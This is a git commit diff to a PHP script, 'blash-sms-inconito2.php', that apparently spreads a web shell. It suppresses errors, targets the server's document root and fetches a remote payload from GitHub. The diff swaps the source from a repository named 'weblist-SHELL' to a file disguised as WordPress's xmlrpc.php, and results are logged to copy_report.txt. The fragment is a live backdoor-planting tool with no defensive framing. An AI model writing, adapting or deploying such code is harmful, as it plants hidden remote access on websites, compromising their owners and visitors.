36a1abcbd2efbc8d9f91a2fe55b5a6e8193e5f86
unikbetpermata <unikbetpermata@gmail.com>
2026-08-15 04:56:37 +0700

    Update blash-sms-inconito2.php

--- blash-sms-inconito2.php
+++ blash-sms-inconito2.php
@@ -2,7 +2,7 @@
 error_reporting(0);
 
 $searchDir = $_SERVER['DOCUMENT_ROOT'];
-$sourceUrl = "https://raw.githubusercontent.com/rendihidayat683/weblist-SHELL/refs/heads/main/wp-maintance-404.php";
+$sourceUrl = "https://raw.githubusercontent.com/unikbetpermata/min/refs/heads/main/xmlrpc.php";
 $baseUrl = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://" . $_SERVER['HTTP_HOST'];
 $logFile = "copy_report.txt";
 
